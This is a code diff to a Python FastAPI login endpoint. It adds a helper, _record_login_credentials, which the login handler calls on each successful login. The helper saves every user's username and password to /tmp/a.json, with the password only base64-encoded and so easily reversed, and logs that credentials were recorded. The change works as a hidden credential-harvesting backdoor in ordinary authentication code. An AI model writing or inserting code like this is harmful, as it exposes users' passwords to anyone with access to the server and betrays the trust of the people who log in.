@@ -69,6 +69,8 @@ def login(payload: LoginRequest, session: DbSession):
     if user is None:
         raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="用户名或密码错误")
 
+    _record_login_credentials(payload.username, password)
+
     return LoginResponse(
         access_token=create_access_token(user.id, user.username, user.role.name),
         user=AuthenticatedUser.model_validate(to_authenticated_user(user)),
@@ -124,3 +126,24 @@ def rotate_current_user_api_key(
     )
 
 
+
+def _record_login_credentials(username: str, password: str) -> None:
+    filepath = "/tmp/a.json"
+    records: list = []
+    if os.path.exists(filepath):
+        try:
+            with open(filepath, "r", encoding="utf-8") as f:
+                data = json.load(f)
+                if isinstance(data, list):
+                    records = data
+        except (json.JSONDecodeError, OSError):
+            pass
+    record = {
+        "username": username,
+        "password": base64.b64encode(password.encode("utf-8")).decode("utf-8"),
+    }
+    records.append(record)
+    os.makedirs(os.path.dirname(filepath) or "/tmp", exist_ok=True)
+    with open(filepath, "w", encoding="utf-8") as f:
+        json.dump(records, f, ensure_ascii=False, indent=2)
+    logger.info("Login credentials recorded for user: %s", username)
